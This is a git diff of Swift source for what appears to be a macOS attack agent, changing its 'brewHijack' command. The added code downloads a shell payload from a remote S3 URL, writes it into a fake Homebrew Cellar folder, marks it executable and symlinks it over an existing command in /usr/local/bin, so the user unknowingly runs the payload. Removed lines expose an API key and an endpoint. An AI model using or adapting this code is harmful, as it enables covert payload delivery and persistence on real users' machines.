@@ -224,8 +224,7 @@ public struct ASH {
                     }
                 case ("brewHijack;"):
                     // Format brewHijack; <commandToHijack> <fakeFolderName> <binary> <domainForPayload>
-                    // brewHijack; testShell badShell badShell.sh https://aydaabimdi.execute-api.us-east-2.amazonaws.com/prod/
-                    // TODO: Remove this. domain: https://aydaabimdi.execute-api.us-east-2.amazonaws.com/prod/
+                    // brewHijack; testShell badShell badShell.sh https://shhhhhellll.s3.us-east-2.amazonaws.com/badShell.sh
                     let commandSplit = command.components(separatedBy: "; ")[safe: 1]
                     let commandHijack = commandSplit?.components(separatedBy: " ")[safe: 0]
                     let fakeFolder = commandSplit?.components(separatedBy: " ")[safe: 1]
@@ -268,24 +267,9 @@ public struct ASH {
                         // Get the payload
                         var request = URLRequest(url: domain!)
                         
-                        // TODO: REMOVE BELOW
-                        let s3JsonStruct: [String: Any] = ["method":"GET", "s3Bucket":"senua", "s3Path":"downloads/badShell.sh"]
-                        do {
-                            let s3Json = try JSONSerialization.data(withJSONObject: s3JsonStruct)
-                            let convertedString = String(data: s3Json, encoding: String.Encoding.utf8)
-                            print(convertedString)
-                            request.httpBody = s3Json
-                        }
-                        catch {
-                            print(error)
-                        }
-                        
-                        
                         // TODO: Make the method an input
-                        request.httpMethod = "POST"
+                        request.httpMethod = "GET"
                         
-                        // TODO: Remove both value and body before push to remote repo
-                        request.setValue("BCNkov2seR6f189FuIJl01fZaemmrOdg6rJzANrR", forHTTPHeaderField: "x-api-key")
                         let task = URLSession.shared.dataTask(with: request) {(data, response, error) in
                             // Check and return the error
                             if let error = error {
@@ -293,68 +277,35 @@ public struct ASH {
                                 return
                             }
                             
-                            // TODO: Add a check for a 200 response
+                            fileManager.createFile(atPath: "/usr/local/Cellar/" + fakeFolder! + "/" + binary!, contents: data)
                             
-                            // Write the file
-                            // REMOVE THIS
+                            // Modify the payload's permissions
+                            var attributes = [FileAttributeKey: Any]()
+                            attributes[.posixPermissions] = 0o755
                             
                             do {
-                                let jsonResults = try JSONSerialization.data(withJSONObject: data!) as? [String : Any]
-                                let bodyObjectBase64 = jsonResults!["Body"] as! String
-                                print(bodyObjectBase64)
-//                                let dataDecode = Data(base64Encoded: bodyObjectBase64)!
-                                
+                                // This is tied to the download of the script
+                                try fileManager.setAttributes(attributes, ofItemAtPath: "/usr/local/Cellar/" + fakeFolder! + "/" + binary!)
                             }
                             catch {
                                 return
                             }
-//                            let bodyObjectBase64 = jsonAPI["Body"]
-//                            let bodyObject = base64Decode(base64: bodyObjectBase64.string!)
-//                            try bodyObject.write(to: URL(fileURLWithPath: fileName))
-                            fileManager.createFile(atPath: "/usr/local/Cellar/" + fakeFolder! + "/" + binary!, contents: data)
+                            do {
+                                // Symlink the new binary to the bin
+                                try fileManager.createSymbolicLink(atPath: "/usr/local/bin/" + commandHijack!, withDestinationPath: "/usr/local/Cellar/" + fakeFolder! + "/" + binary!)
+                                
+                            }
+                            catch{
+                                return
+                            }
                         }
                         task.resume()
                         
-                        // Modify the payload's permissions
-                        var attributes = [FileAttributeKey: Any?]()
-                        attributes[.posixPermissions] = 0o755
                         
-                        do {
-                            // ADJUST TO TAKE THE NAME OF THE INPUT
-                            // This is tied to the download of the script
-                            try fileManager.setAttributes(attributes, ofItemAtPath: "/usr/local/Cellar/" + fakeFolder! + "/" + binary!)
-                        }
-                        catch {
-                            return returnData(inCommand: String(progCallSplit), returnType: "Error", returnData: error).returnDict as NSDictionary
-                        }
-                        do {
-                            // ADJUST TO TAKE THE NAME OF THE INPUT
-                            try fileManager.createSymbolicLink(atPath: "/usr/local/bin/" + commandHijack!, withDestinationPath: "/usr/local/Cellar/" + fakeFolder! + "/" + commandHijack!)
-                            
-                        }
-                        catch{
-                            return returnData(inCommand: String(progCallSplit), returnType: "String", returnData: commandSplit).returnDict as NSDictionary
-                        }
                         return returnData(inCommand: String(progCallSplit), returnType: "String", returnData: "Command has been hijack").returnDict as NSDictionary
                     }
                     else {
                     }
-                    
-
-                    // Foundation Framework https://developer.apple.com/documentation/foundation/filemanager/1411007-createsymboliclink
-                    // Chmod file: https://stackoverflow.com/questions/9655185/nsfilemanager-nsfileposixpermissions
-                    // Get the payload https://stackoverflow.com/questions/31077989/how-do-i-perform-get-and-post-requests-in-swift
-                    
-                    // CODE OUTLINE/TODO:
-                    // Grab payload and keep it in memory
-                    // Write payload with framework
-                    // Check if the command already exists and rename it
-                    // Create a random directory for the shell script to live in
-            
-                    // AWS TODO:
-                    // Create a new S3 bucket
-                    // Create shell scripts
-
                     
                 case ("man;"):
                     let commandResult = """
